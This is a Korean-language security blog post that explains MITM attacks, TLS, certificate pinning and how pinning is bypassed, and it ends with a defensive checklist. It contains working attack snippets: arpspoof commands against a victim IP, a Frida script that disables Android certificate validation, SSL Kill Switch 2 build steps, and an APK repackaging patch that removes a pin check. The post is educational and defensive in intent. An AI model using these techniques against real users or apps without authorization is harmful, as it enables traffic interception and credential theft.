## 🌐 MITM, SSL/TLS Pinning & Bypass - 한눈에 정리

---

## 🧭 인트로: "🔒 표시가 뜨니 안전하겠지?"

카페 Wi-Fi에서 로그인했을 뿐인데, 일주일 뒤 불법 결제 알림이 뜬 적이 있으신가요?  
모바일 앱은 HTTPS 아이콘을 보여주지만 Burp Suite에서는 평문 JSON이 잡힙니다.  
<strong>MITM(Man-in-the-Middle)</strong> 공격은 "패킷이 목적지까지 그대로 도착한다"는 우리의 믿음을 깨뜨립니다.

이 글은 다음 여섯 단계로 <strong>MITM → TLS → Pinning → Bypass</strong>를 총정리합니다.

> <strong>목차</strong>  
> 1️⃣ MITM이란?  
> 2️⃣ MITM 실전 사례 & PoC 코드  
> 3️⃣ SSL/TLS (＋HTTPS) 기초  
> 4️⃣ SSL/TLS Pinning이란?  
> 5️⃣ Pinning Bypass 사례 & 코드  
> 6️⃣ 결론: 방어 체크리스트

---

## 1️⃣ MITM이란? - 공격자 "가로채기" 시나리오

<strong>MITM(Man-In-The-Middle)이란 공격자가 사용자와 서버(또는 두 사람) 사이의 통신에 몰래 끼어들어 데이터를 도청하거나 조작하는 공격</strong>입니다.

로그인 정보, 금융 데이터 등 <strong>민감한 정보가 탈취</strong>되거나 <strong>메시지가 변조</strong>될 수 있습니다.

![출처: https://powerdmarc.com/ko/what-is-a-mitm-attack/](/blog/mitm-ssl-tls-pinning/01.jpg)

*출처: https://powerdmarc.com/ko/what-is-a-mitm-attack/*

<table style="border-collapse: collapse; width: 100%;" border="1" data-ke-align="alignLeft"><tbody><tr><td><b>단계</b></td><td><b>설명</b></td><td><b>대표 도구</b></td></tr><tr><td><b>위치 선점</b></td><td>피해자-서버 사이 트래픽 경로를 장악</td><td>ARP Spoofing (arpspoof), Evil-Twin AP, DNS Poisoning</td></tr><tr><td><b>세션 가로채기</b></td><td>TLS 핸드셰이크에 <b>공격자가 가짜(사설) 인증서</b> 주입 → 클라이언트가 신뢰 시 암·복호화 가능</td><td>Burp Suite, mitmproxy</td></tr><tr><td><b>스니핑·변조</b></td><td>평문 데이터 탈취·조작 후 다시 암호화해 서버 전달</td><td>Burp Rewrite, BetterCAP modules</td></tr></tbody></table>

❗ <strong>결정적 포인트</strong>

-   사용자가 <strong>사설 CA</strong>를 '신뢰된 루트'로 등록하거나, 앱이 <strong>Pinning</strong>을 하지 않으면 공격 성공
-   클라우드·API 키, 세션 토큰, 개인 정보가 그대로 노출되는 사고는 대부분 이 흐름으로 발생

---

## 2️⃣ MITM 실전 사례 & 코드

<table style="border-collapse: collapse; width: 100%; height: 144px;" border="1" data-ke-align="alignLeft"><tbody><tr style="height: 21px;"><td style="width: 10%; height: 21px;"><b>분류</b></td><td style="width: 34.1861%; height: 21px;"><b>시나리오</b></td><td style="width: 55.8139%; height: 21px;"><b>PoC 스니펫</b></td></tr><tr style="height: 39px;"><td style="width: 10%; height: 39px;"><b>LAN 내부</b></td><td style="width: 34.1861%; height: 39px;">회의실 공유 LAN에서 ARP Spoof → 임직원 로그인 쿠키 탈취</td><td style="width: 55.8139%; height: 39px;">#&nbsp;Kali<br>echo&nbsp;1&nbsp;&gt;&nbsp;/proc/sys/net/ipv4/ip_forward<br>sudo arpspoof -i wlan0 -t &lt;victimIP&gt; &lt;gatewayIP&gt;</td></tr><tr style="height: 42px;"><td style="width: 10%; height: 42px;"><b>공용 Wi-Fi</b></td><td style="width: 34.1861%; height: 42px;">Evil-Twin AP 이름만 동일 → 강제 연결 → HTTPS 다운그레이드 시도</td><td style="width: 55.8139%; height: 42px;">Wi-Fi Pineapple / airgeddon fake AP</td></tr><tr style="height: 42px;"><td style="width: 10%; height: 42px;"><b>모바일 앱</b></td><td style="width: 34.1861%; height: 42px;">Android 앱 Pinning 미설정 → Burp CA 주입 → 토큰·카드정보 수집</td><td style="width: 55.8139%; height: 42px;">Burp CA install → 앱 실행 → Intercept</td></tr></tbody></table>

<strong>실전 보고서</strong>

-   2019 "다크호텔": 공항 Wi-Fi Evil-Twin → 기업 VPN 자격증명 탈취
-   2022 Crypto-Exchange: 사내 테스트 노트북 ARP Spoof → 거래 API Key 유출   
    
    ![출처: https://www.okta.com/kr/identity-101/arp-poisoning/](/blog/mitm-ssl-tls-pinning/02.png)
    
    *출처: https://www.okta.com/kr/identity-101/arp-poisoning/*
    

---

## 3️⃣ SSL/TLS (＋HTTPS) 기초 3분 요약

<strong>SSL/TLS는 안전한 데이터 암호화와 신원 인증을 위한 프로토콜</strong>이고, <strong>HTTPS는 그것을 웹</strong>에 적용한 것입니다.

<table style="border-collapse: collapse; width: 100%;" border="1" data-ke-align="alignLeft"><tbody><tr><td><b>요소</b></td><td><b>역할</b></td><td><b>핵심</b></td></tr><tr><td><b>TLS</b></td><td>전송 계층 암호화 프로토콜</td><td>대칭키 교환 + 인증서를 통한 서버/클라 신원 검증</td></tr><tr><td><b>X.509 인증서</b></td><td>공개키·서명·만료·CN 포함</td><td>브라우저/OS는 <b>신뢰 루트 CA</b> 체인을 검증</td></tr><tr><td><b>HTTPS</b></td><td>HTTP + TLS</td><td>443 포트, TLS 세션 위에 HTTP 요청/응답 전달</td></tr></tbody></table>

![TLS의 작동 원리 (출처: https://www.cloudflare.com/ko-kr/learning/ssl/transport-layer-security-tls/)](/blog/mitm-ssl-tls-pinning/03.png)

*TLS의 작동 원리 (출처: https://www.cloudflare.com/ko-kr/learning/ssl/transport-layer-security-tls/)*

> TLS 1.3 이후 "Perfect Forward Secrecy"가 기본 → 키 탈취돼도 과거 트래픽 복호 불가  
> 단, <strong>클라이언트가 잘못된 CA를 신뢰</strong>하면 아무 소용없음

---

## 4️⃣ SSL/TLS Pinning이란?

모바일 앱, 웹앱에서 <strong>MITM</strong>을 막기 위해 서버의 인증서나 공개키를 앱에 <strong>직접 저장</strong>해 두고, 서버와 통신할 때 실제로 받은 인증서가 이와 <strong>일치하는지 검사</strong>하는 보안 기법입니다.

신뢰할 수 있는 CA(인증기관)만 믿는 것이 아니라, <strong>특정 서버의 인증서/공개키만 신뢰</strong>하여 공격자가 위조 인증서를 써도 통신을 차단합니다.

![출처: https://www.indusface.com/learning/what-is-ssl-pinning-a-quick-walk-through/](/blog/mitm-ssl-tls-pinning/04.png)

*출처: https://www.indusface.com/learning/what-is-ssl-pinning-a-quick-walk-through/*

<table style="border-collapse: collapse; width: 100%;" border="1" data-ke-align="alignLeft"><tbody><tr><td><b>Pinning 유형</b></td><td><b>구현 방법</b></td><td><b>장점</b></td><td><b>운영상 주의</b></td></tr><tr><td><b>Static Pinning</b></td><td>앱 binary에 <b>SPKI SHA-256 해시</b> 하드코딩</td><td>MITM 우회 난도 ↑</td><td>인증서 갱신 시 <b>앱 업데이트 필수</b></td></tr><tr><td><b>Dynamic Pinning</b></td><td>서버가 Public-Key-Pins 헤더 or TrustKit SDK</td><td>교체 유연</td><td>헤더 변조 위험, 구현 복잡</td></tr><tr><td><b>Cert Directory Pinning</b> (iOS ATS)</td><td>NSAppTransportSecurity + PinnedDomains</td><td>시스템 정책으로 거부</td><td>도메인·서브도메인 관리 필요</td></tr></tbody></table>

\=> <strong>SMB/스타트업 추천</strong>: "현재 키 + 백업 키" 2개를 Static Pinning → 만료/교체 시 무중단

---

## 5️⃣ Pinning Bypass 사례 & 코드

## 5-1. Android – Frida 런타임 패치

```javascript
// ssl-bypass.js
Java.perform(function() {
  var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  TrustManager.checkServerTrusted.implementation = function(chain, authType) {
    console.log('[+] bypassed checkServerTrusted');
    return;   // 무조건 통과
  };
});
```

```bash
frida -U -f com.vuln.app -l ssl-bypass.js
```

## 5-2. iOS – SSL-Kill-Switch-2

```bash
git clone https://github.com/nabla-c0d3/ssl-kill-switch2
make
# Jailbreak 디바이스에 dylib 탑재 후 리스프링
```

-   Mobile Safari 포함 전 시스템 Pinning·ATS 검사 우회 → Burp에서 트래픽 확인

## 5-3. React-Native 앱 코드 우회

```javascript
// Before (security.js)
if (!CertificatePinning.verify(serverCert)) throw Error('Pin failure');

// After (repack)
if (false) throw Error('Pin failure');
```

-   apktool d → security.js 수정 → apktool b → jarsigner → 테스트 디바이스 설치

---

## 6️⃣ 결론 – 실전 방어 체크리스트

1.  <strong>앱 NetworkSecurityConfig</strong>  
    base-config trust-anchors → <certificates src="system" /> <strong>user CA 제외</strong>
2.  <strong>다중 Pin + 백업 Key</strong> (만료 전 롤링 대비)
3.  루팅·Frida·Xposed 탐지 라이브러리 적용 ⬌ 무결성 검사
4.  <strong>API 레이어</strong> - 요청마다 timestamp/nonce/HMAC → MITM 변조 탐지
5.  서버 측 <strong>CT Log 모니터링</strong> & ACME Webhook → 미승인 인증서 발급 감지
6.  내부 테스트·Debug 빌드에는 <strong>Pinning OFF</strong> → 운영 빌드 ENABLE 스위치
7.  레거시 시스템(업무 포탈 등)에는 <strong>HSTS + TLS1.2 이상 강제</strong>

---

## ✍️ 나의 생각

네트워크 공부를 열심히 해야 함을 다시 깨닫습니다..

---

<strong>참고 자료</strong>

-   [https://powerdmarc.com/ko/what-is-a-mitm-attack/](https://powerdmarc.com/ko/what-is-a-mitm-attack/)
-   [https://www.okta.com/kr/identity-101/arp-poisoning/](https://www.okta.com/kr/identity-101/arp-poisoning/)
-   [OWASP Mobile Security Testing Guide](https://owasp.org/www-project-mobile-security-testing-guide/)
-   [Frida Official Documentation](https://frida.re/docs/home/)
-   [SSL Kill Switch 2 GitHub](https://github.com/nabla-c0d3/ssl-kill-switch2)
-   [https://www.indusface.com/learning/what-is-ssl-pinning-a-quick-walk-through/](https://www.indusface.com/learning/what-is-ssl-pinning-a-quick-walk-through/)

---
